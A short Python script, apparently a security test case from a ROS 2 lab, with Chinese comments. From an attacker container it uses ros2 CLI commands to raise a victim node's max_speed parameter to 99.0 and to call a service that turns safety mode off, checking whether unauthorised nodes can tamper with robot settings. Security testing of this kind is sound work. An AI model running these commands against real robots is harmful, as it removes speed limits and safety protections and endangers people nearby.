#!/usr/bin/env python3
"""
測試案例 2.5：Parameter 竄改 + Service 濫用

目的：驗證未授權參與者能否修改敏感參數與呼叫服務。
預期結果（未加固）：可將 max_speed 改為危險值、關閉 safety_mode。
成功判定：victim param_service 日誌出現 max_speed 被改與 safety_mode=False。

用法（attacker 容器內）：
    source /opt/ros/jazzy/setup.bash
    python3 /work/attacks/tamper_param.py
"""
import subprocess


def run(cmd, timeout=8):
    out = subprocess.run(
        f'source /opt/ros/jazzy/setup.bash && {cmd}',
        shell=True, capture_output=True, text=True, timeout=timeout,
        executable='/bin/bash',
    )
    return (out.stdout + out.stderr).strip()


def main():
    print('=== [2.5] Parameter 竄改 + Service 濫用 ===\n')

    print('--- 竄改 max_speed -> 99.0（解除速度上限）---')
    print(run('ros2 param set /victim_param_service max_speed 99.0'))
    print('讀回確認：', run('ros2 param get /victim_param_service max_speed'))
    print()

    print('--- 濫用 /set_safety_mode -> 關閉安全模式 ---')
    print(run('ros2 service call /set_safety_mode std_srvs/srv/SetBool "{data: false}"'))


if __name__ == '__main__':
    main()
